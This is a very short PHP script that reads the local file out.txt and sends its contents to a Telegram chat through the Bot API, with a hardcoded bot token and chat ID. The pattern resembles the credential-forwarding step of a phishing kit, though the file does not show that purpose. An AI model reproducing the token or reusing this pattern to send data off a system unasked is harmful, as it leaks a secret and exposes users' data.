<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1381242611:AAFZEtNPlqPaneZxXCoXfxZtSCT-hOD9l1w/sendMessage?chat_id=1070821707&text=$msg");
?>